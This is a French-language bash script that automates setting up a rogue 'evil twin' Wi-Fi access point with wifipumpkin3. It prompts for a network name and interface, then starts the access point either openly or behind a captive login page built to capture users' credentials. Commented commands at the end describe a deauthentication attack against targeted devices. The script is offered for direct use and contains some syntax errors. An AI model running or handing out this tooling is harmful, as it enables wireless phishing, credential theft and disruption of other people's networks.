#!/bin/bash
clear
echo -e "\033[33m"
echo "------------------------------------------"
echo  "    Script automatique de WPA Spoofing"
echo "------------------------------------------"
echo "         creée par:  Kuroakashiro"
echo "------------------------------------------"
echo -e "\033[00m"
sleep 5

apt update -y && apt upgrade -y

if [ $? -eq 100 ];
then
  clear
  echo ""
  echo -e "\033[31m[ ERREUR ] \033[33m Le disk ne contien pas assée de place pour la mise à joure \033[00m"
  echo ""
  echo "[1] Pour continée tous de même !"
  read -p ": " continu
  if [ $continu != "1" ];
    clear
    echo "[OK] On continu !"
  else
    exit
  fi
fi

dpkg --configure -a

apt install libssl-dev libffi-dev build-essential -y

git clone https://github.com/P0cL4bs/wifipumpkin3.git  
cd ./wifipumpkin3/
apt install python3-pyqt5

python3 -c "from PyQt5.QtCore import QSettings; print('done')"

# python3 setup.py install
./install.sh

apt install hostapd -y

rm -f ./NoProxy.pulp
rm -f ./whidLoginProxy.pulp


clear
echo
echo Entrez le nom du réseau Wi-Fi
echo
read -p ": " ssid
clear
echo
echo Entrez le nom de la carte reseau à utiliser pour émettre
echo
read -p ": " CartReseau
clear
echo
echo choisiser le type de Wi-Fi
echo
echo [1] normal sens Proxy
echo [2] Wi-Fi avec page de login
echo
read -p ": " use

if [ "$use" = "1" ];
then
  echo # Creating regulard Wifi point >> NoProxy.pulp
  echo set interface $CartReseau >> NoProxy.pulp
  echo set ssid $ssid >> NoProxy.pulp
  echo set proxy noproxy >> NoProxy.pulp
  echo ignore pydns_server >> NoProxy.pulp
  echo start >> NoProxy.pulp
  wifipumpkin3 --pulp ./NoProxy.pulp

elif [ "$use" = "2" ];
then
  echo # Creating Wifi point Whid web Login page  >> whidLoginProxy.pulp
  echo set interface $CartReseau >> whidLoginProxy.pulp
  echo set ssid $ssid >> whidLoginProxy.pulp
  echo set proxy captiveflask >> whidLoginProxy.pulp
  echo ignore pydns_server >> whidLoginProxy.pulp
  echo start >> whidLoginProxy.pulp 
  
  wifipumpkin3 --pulp ./whidLoginProxy.pulp

fi



######################
# Creating Wifi point
# wifipumpkin3
# set interface wlan0
# set ssid Free Wifi
# set proxy noproxy
# ignore pydns_server
# start

###############################
# Page de connexion
###############################
# wifipumpkin3
# set interface wlan0
# set ssid Free Wifi
# set proxy captiveflask
# ignore pydns_server
# start

#######################################
# Wifipumpkin3 multi AP deauth attack #
#######################################
# use wifi.wifideath
# scan
# add MAC address
# targets 
# add .
# targets
# show_scan
# start







